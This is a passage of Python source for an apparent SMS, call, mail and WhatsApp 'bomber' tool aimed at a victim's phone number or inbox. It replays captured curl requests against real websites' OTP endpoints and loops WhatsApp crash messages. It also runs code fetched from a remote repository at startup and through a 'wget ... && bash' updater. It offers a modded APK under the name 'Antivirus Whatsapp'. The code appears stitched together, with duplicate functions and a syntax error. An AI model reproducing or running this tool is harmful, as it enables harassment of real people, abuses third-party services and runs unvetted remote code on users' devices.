"cookie:_fbp=fb.1.1617732151901.1506350729" -H "cookie:_uetvid=3fc25d80970211eb8d338b0d309fc18b" -H "cookie:_uetsid=3fbff210970211eb8bb43776c1b2927f" -H "cookie:_gat_tracker1=1" -H "cookie:_gid=GA1.3.1652383625.1617732104" -H "cookie:_ga=GA1.3.1402257721.1617732104" -H "cookie:zarget_user_id=38b09e00-c703-4f2a-fc3e-7adf01a4f6ff" -H "cookie:zarget_visitor_info=%7B%7D" -H "cookie:v_rtime=" -H "cookie:vfst_time=" -H "cookie:PHPSESSID=fbugal9u9r5ksivugk2fq7s515" -H "cookie:__utmb=56509048.12.8.1617732141187" -H "cookie:__utmt=1" -H "cookie:__utmz=56509048.1617732105.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)" -H "cookie:__utmc=56509048" -H "cookie:__utma=56509048.1402257721.1617732104.1617732105.1617732105.1" -H "cookie:_gid=GA1.2.1652383625.1617732104" -H "cookie:_ga=GA1.2.1402257721.1617732104" -H "cookie:USERCNTRY=98" -H "cookie:bm_reg_track_cookie=78194706042021233143" -H "cookie:encapp=Ja67cUo_ow%2C%2C" -H "cookie:bm_reg_track_cookie=78194706042021233143" -d 'PHPSESSID=fbugal9u9r5ksivugk2fq7s515&GENDER=M&USERNAME=Vjkk+Viokhfd&CONTACTNO='''+target+'''&bmdate=30-Jun-1991&USERAGE=&EMAIL=kanuyap%40gmail.com&PASSWORD=kanuyap%40gmail.com12&form1=Continue&cookieType=internal&cookieVal=172.22.2.240%3B172.22.5.8%3A%3A003%3A%3A%3A%3A0%3A%3A00300000027%3A%3AY%3A%3A2021-04-06+23%3A31%3A43%3A%3A&REGISPROFILECREATEDHASHEXT=8&mem_gender=&mem_name=&COUNTRYCODE=98&mem_no=&mem_USERAGE=&RELIGION=4&MOTHERTONGUE=33&mem_email=&mem_password=' "https://m.bharatmatrimony.com/mobwap/registration/register-tracky.php?page=2" > /dev/null 2>&1
    ''')
    requests.post(url, headers=headers, data=data)
#call
    os.system('''
    curl -X POST -H "Host:www.careers360.com" -H "content-length:50" -H "origin:https://www.careers360.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "accept:*/*" -H "x-requested-with:XMLHttpRequest" -H "x-csrftoken:J4P12bH8IEVWNrnUcy4mrfRzNKIu3vaJmkO37hLry7aKEDdNOHrGaPw8MnvabhFs" -H "dnt:1" -H "referer:https://www.careers360.com/user/otp-verify/0405ac328d58dbbc41444a2dba7f6e01?destination=&click_location=header&google_success=header" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:WZRK_S_654-ZZ4-5Z5Z=%7B%22p%22%3A4%2C%22s%22%3A1615442265%2C%22t%22%3A1615442744%7D" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.1.1615442263972.287121379" -H "cookie:WZRK_G=11b1ac98a6434bd3bf531f8930a8b5e4" -H "cookie:__auc=4f394ef21781fdc95d395e1ab07" -H "cookie:__asc=4f394ef21781fdc95d395e1ab07" -H "cookie:_gid=GA1.2.83082818.1615442253" -H "cookie:_ga=GA1.2.1609863453.1615442253" -H "cookie:_gcl_au=1.1.2109846685.1615442253" -H "cookie:csrftoken=hGKglWYRlX4jo91hUvmvIrw8CxV72jXxUWJiq22abqj7flRawEJPr1bHBaINa5sg" -H "cookie:dataLayer_=Home Pages" -H "cookie:_omappvp=COce7fS8fP7N1342MAsnIzRKludnKoiiVsHqGHK98cpUVuP4tI6rM61yqAcAHmxjaSWTkCi1rZ8zQBp4hvT1VxLVfdPYPxPl" -d 'mobile_number='''+target+'''&method=call&uid=618947777' "https://www.careers360.com/ajax/no-cache/user/otp-send" > /dev/null 2>&1
    ''')
def infinity_tt():
	index = 0
	while True:
		yield index
		index += 1
def sms():
	check_intr()
	os.system('clear')
	print(Style.BRIGHT+logo)
	print(G)
	print(f"{R} | WARNING |  {B}\n\n This tool is very dangerous don't try it on your self\n ")
	print()
	print ()
	target = input(
	    f"{G}[{W}+{G}] Enter the Victim's Phone number \n\n{W}-----{R}# {C}")	
	print()
	a = requests.get('https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.protected.numbers').text
	if target in a:
		print(f"\n {R} You Can't Bomb This Number")
		exit(2)
	else:
		pass	
	print(f"\n{B} Press {G}Ctrl { R}+ {G} C {B} to exit\n")

	file1 = open("/data/data/com.termux/files/usr/bin/num.file","w")
	file1.writelines(target) 
	file1.close() 
	for i in range (1,100000000):
	    try:
	    	   line = subprocess.check_output(" cat /data/data/com.termux/files/usr/bin/num.file ",shell=True)
	    	   line = str(line)
	    	   st = str(line.replace("b'",""))
	    	   s = st.replace("'","")
	    	   target = s
	    	   print(f"{B}[{W}{i}{B}] {C} 140 Sms + Calls : {G}{target}")
	    	   infinity()
	    	   print()
	    except KeyboardInterrupt:
	    	print(f"\n{G} Exiting")
	    	res()
	res()
def wpbomb():
	check_intr()
	os.system('clear')
	print(logo)
	print(G)
	print("Antivirus Whatsapp is required")
	ig = input(f"{Y}Do you want to install Antivirus whatsapp ?? [y/n] = ")
	if ig == 'y':
	  file = os.path.isfile('/sdcard/Download/AntivirusWp.apk')
	  if file == True:
	    print("Skipping Download")
	    os.system('termux-open /sdcard/Download/AntivirusWp.apk')
	  else:
	    print(f"{G} Starting Download")
	    check_intr
	    os.chdir('/sdcard/Download/')
	    tload.download_file_pg('https://softalien.xyz/dl/whatsmod/YOWA_v8.93_By_Yowayousef.apk')
	    os.system('mv /sdcard/Download/test.dat  AntivirusWp.apk')
	    os.system('termux-open /sdcard/Download/AntivirusWp.apk')
	  pass
	number = input(f"{G}[{W}+{G}] {G}Enter Victim's Phone number with country Code\n\n{R}>>>{G} ")

	print()
	crash = int(
	    input(f'{G}[{W}+{G}] Enter the number of crashes {C}(Max 10000) \n\n{G}=> '))
	link = (f"""xdg-open https://wa.me/{number}/?text=BaapG%20Jai%20Hind%F0%9F%92%A3%20Ghazipur%20Up%20India%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40krish_na_2568%F0%9F%A4%A3%0A%F0%9F%94%A5HAY%20DUDA%20NIKAH%20YUK%20AWOKWOK%20%F0%9F%98%88%0A*https%3A%2F%2Fyoutu.be%2F4S-i078-YYE*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A*VIRTEX%20BUATAN%20MR%20VIRUS%20BUKAN%20KALENG%C2%B2*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2VURUS-SPM%F0%9F%92%A3%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*
""")
	for i in range(crash):
		print()
		print(f"{Y}[✓] Sending Now")
		link1 = os.system(link)
		time.sleep(5)
		if link1 == 0:
			print(f"{G} Successful Send 👍")
			pass
		else:
			print(f"{G}[×] Failed  ")
		time.sleep(0.2)
	res()
def ver_check():
	print(G + '[+]' + C + ' Checking for Updates.....', end='')
	ver_url = 'https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.version'
	try:
		ver_rqst = requests.get(ver_url)
		ver_sc = ver_rqst.status_code
		if ver_sc == 200:
			github_ver = ver_rqst.text
			github_ver = github_ver.strip()
			if version == github_ver:
				print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
			else:
				print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
		else:
			print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
	except Exception as e:
		print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
def banner():
	print(logo)


def clr():
	os.system('clear')
	pass
ver_url = 'https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.exec'
ver_rqst = requests.get(ver_url)
ver_sc = ver_rqst.status_code
github_ver = ver_rqst.text
link = github_ver.strip()
textexe = format(link)
def main():
	os.system('clear')
	exec(textexe)
	ver_check()
	print(logo)
	print(Y)
	os.system(f'dat=$(date) && echo {Y}  ✯ {W}STARTED ON : {C}$dat')
	print(f"{W}\n-----------------------------------------------")
	print(f"{Y}⚡ This tool is only for Educational Purposes !")
	print(f"{W}-----------------------------------------------")
	print(f"\n{G}Choose Any Option\n")
	text = (f"""{G}[{W}${G}]{R} BRAMOS ATACK☣️ {W}>>>{G}\n[{W}1{G}]{Y} SMS ATTACK {W}>>>\n{G}[{W}2{G}]{Y} CALL ATTACK {W}>>>\n{G}[{W}3{G}]{Y} MAIL BOMBER\n{W}{G}[{W}4{G}]{Y} WHATSAPP BOMBER{W} >>>\n{G}[{W}5{G}]{Y} ABOUT {W}>>>\n{G}[{W}6{G}]{Y} EXIT {W}>>>\n{G}[{W}>{G}]{Y} UPDATE {W}>>>\n""")
	print(text)
	a = input(f"{R} >>> {G}")
	if a == '$':
		sms()
	elif a == '1':
		clr()
		banner()
		selectnode(mode='sms')
		res()
	elif a == '2':
		selectnode(mode='call')
	elif a == '3':
		selectnode(mode='mail')
	elif a == '4':
		wpbomb()		
		res()	
	elif a == '5':
		print(f"{C}\n All Credit : priyans0830m \n {G}Coded by priyanshu singhl\n\n{W}{lic}\n\n")
		res()
	elif a == '6':
		exit()
	elif a == '>':
		print()
		print(f'{G} Starting Update')
		print()
		ver_check()
		check_intr()
		os.system("wget https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.updatefile && bash .updatefile")
		print(f"{G} Restart it")
		exit()
	else:
		return main()	
def res():
	r=input(f"{Y}Do you want to restart [y/n] = ")
	if r =='y':
		main()
	else:
		print()
		print(f"Follow on Ig : {W}@priyanshu_7270")
		exit()
print(Style.BRIGHT)

from io import BytesIO

from concurrent.futures import ThreadPoolExecutor, as_completed
try:
	import utils
except ModuleNotFoundError:
	os.system('pip install baapgattackutlis')
from utils.decorators import MessageDecorator
from utils.provider import APIProvider

try:
    import requests
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed)")
    print(
        "Type `pip3 install -r requirements.txt` to "
        " install all required packages")
    sys.exit(1)
check = os.path.isfile('/usr/bin/bash')


def readisdc():
    with open(fileisd) as file:
        isdcodes = json.load(file)
    return isdcodes


def get_version():
    try:
        return open(".version", "r").read().strip()
    except Exception:
        return '1.0'


def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        print(logo)
        mesgdcrt.FailureMessage("Poor internet connection detected")
        sys.exit(2)


def format_phone(num):
    num = [n for n in num if n in string.digits]
    return ''.join(num).strip()


def do_git_update():
    success = False
    try:
        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL, end='')
        process = subprocess.Popen("git checkout . && git pull ",
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT)
        while process:
            print(ALL_COLORS[0]+'.'+RESET_ALL, end='')
            time.sleep(1)
            returncode = process.poll()
            if returncode is not None:
                break
        success = not process.returncode
    except Exception:
        success = False
    print("\n")

    if success:
        mesgdcrt.SuccessMessage("Baapg-Attack was updated to the latest version")
        mesgdcrt.GeneralMessage(
            "Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update Baapg-Attack.")
        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
        mesgdcrt.GeneralMessage("Then run command:")
        print(
            "git checkout . && "
            "git pull https://github.com/TheSpeedX/Baapg-Attack.git HEAD")
    sys.exit()


def update():
	pass


def check_for_updates():
    if DEBUG_MODE:
        mesgdcrt.WarningMessage(
            "DEBUG MODE Enabled! Auto-Update check is disabled.")
        return
    mesgdcrt.SectionMessage("Checking for updates")
    fver = requests.get(
        "https://raw.githubusercontent.com/TheSpeedX/Baapg-Attack/master/.version"
    ).text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        update()
    else:
        mesgdcrt.SuccessMessage("Baapg-Attack is up-to-date")
        mesgdcrt.GeneralMessage("Starting Baapg-Attack")


def notifyen():
    try:
        if DEBUG_MODE:
            url = "https://github.com/TheSpeedX/Baapg-Attack/raw/dev/.notify"
        else:
            url = "https://github.com/TheSpeedX/Baapg-Attack/raw/master/.notify"
        noti = requests.get(url).text.upper()
        if len(noti) > 10:
            mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
            print()
    except Exception:
        pass

def get_phone_info():
    while True:
        target = ""
        cc = input(mesgdcrt.CommandMessage(
            f"{G}Enter your country code (Without +): "))
        cc = format_phone(cc)
        if not country_codes.get(cc, False):
            mesgdcrt.WarningMessage(
                "{G}The country code ({cc}) that you have entered"
                " is invalid or unsupported".format(cc=cc))
            continue
        target = input(mesgdcrt.CommandMessage(
            f"{G}Enter the target number: +" + cc + " "))
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage(
                "The phone number ({target})".format(target=target) +
                "that you have entered is invalid")
            continue
        return (cc, target)  


def get_mail_info():
    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
    while True:
        target = input(mesgdcrt.CommandMessage(f"{G}Enter target mail: "))
        if not re.search(mail_regex, target, re.IGNORECASE):
            mesgdcrt.WarningMessage(
                "The mail ({target})".format(target=target) +
                " that you have entered is invalid")
            continue
        return target


def pretty_print(cc, target, success, failed):
    requested = success+failed
    banner()
    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
    print()
    print(f"{C}╔═════════════════════════════════╗")
    print(f"{C}║ {G}Target       :{Y} " + cc + " " + target+"")
    print(f"{C}║ {G}Sent         :{Y} " + str(requested)+"")
    print(f"{C}║ {G}Successful   :{B} " + str(success)+"")
    print(f"{C}║ {G}Failed       :{R} " + str(failed)+"")
    print(f"{C}╚═════════════════════════════════╝")



def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    banner()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count))
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
                            " seconds")
    mesgdcrt.WarningMessage(
        "This tool was made for fun and research purposes only\n")
    print(f"{G} It will automatically start in 5sec")
    time.sleep(5)     

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("Your country/target is not supported yet")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        print(logo)
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    print(logo)
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    time.sleep(1.5)
    res()


def selectnode(mode="sms"):
    mode = mode.lower().strip()
    try:
        clr()
        print(logo)

        max_limit = {"sms": 100000, "call": 60, "mail": 100000}
        cc, target = "", ""
        if mode in ["sms", "call"]:
            cc, target = get_phone_info()
            if cc != "91":
                max_limit.update({"sms": 100})
        elif mode == "mail":
            target = get_mail_info()
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:
                message = (Style.BRIGHT+Fore.GREEN+"Enter number of {type}".format(type=mode.upper()) +
                           " to send (Max {limit}): ".format(limit=limit))
                count = int(input(mesgdcrt.CommandMessage(message)).strip())
                if count > limit or count == 0:
                    mesgdcrt.WarningMessage("You have requested " + str(count)
                                            + " {type}".format(
                                                type=mode.upper()))
                    mesgdcrt.GeneralMessage(
                        "Automatically capping the value"
                        " to {limit}".format(limit=limit))
                    count = limit
                delay = float(input(
                    mesgdcrt.CommandMessage(G+"Enter delay time (in seconds): "))
                    .strip())
                # delay = 0
                max_thread_limit = (count//10) if (count//10) > 0 else 1
                max_threads = int(input(
                    mesgdcrt.CommandMessage(G+
                        "Enter Number of Thread (Recommended: {max_limit}): "
                        .format(max_limit=max_thread_limit)))
                    .strip())
                max_threads = max_threads if (
                    max_threads > 0) else max_thread_limit
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except Exception:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()

        workernode(mode, cc, target, count, delay, max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()


mesgdcrt = MessageDecorator("icon")
if sys.version_info[0] != 3:
    mesgdcrt.FailureMessage("Baapg-Attack will work only in Python v3")
    sys.exit()


country_codes = readisdc()["isdcodes"]


__VERSION__ = get_version()
__CONTRIBUTORS__ = ['SpeedX', 't0xic0der', 'scpketer', 'priyans0830m]

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

ASCII_MODE = False
DEBUG_MODE = False

description = """Baapg-Attack - Your Friendly Spammer Application

Baapg-Attack can be used for many purposes which incudes -
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

Baapg-Attack is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,
                                 epilog='Coded by SpeedX !!!')
parser.add_argument("-sms", "--sms", action="store_true",
                    help="start Baapg-Attack with SMS Bomb mode")
parser.add_argument("-call", "--call", action="store_true",
                    help="start Baapg-Attack with CALL Bomb mode")
parser.add_argument("-mail", "--mail", action="store_true",
                    help="start Baapg-Attack with MAIL Bomb mode")
parser.add_argument("-ascii", "--ascii", action="store_true",
                    help="show only characters of standard ASCII set")
parser.add_argument("-u", "--update", action="store_true",
                    help="update Baapg-Attack")
parser.add_argument("-c", "--contributors", action="store_true",
                    help="show current Baapg-Attack contributors")
parser.add_argument("-v", "--version", action="store_true",
                    help="show current Baapg-Attack version")


def mainfunction():
    args = parser.parse_args()
    if args.ascii:
        ASCII_MODE = True
        mesgdcrt = MessageDecorator("stat")
    if args.version:
        print("Version: ", __VERSION__)
    elif args.contributors:
        print("Contributors: ", " ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    elif args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice = ""
        avail_choice = {
            "1": "SMS",
            "2": "CALL",
            "3": "MAIL"
        }
        try:
            while (choice not in avail_choice):
                clr()
                print(logo)
                print("Available Options:\n")
                for key, value in avail_choice.items():
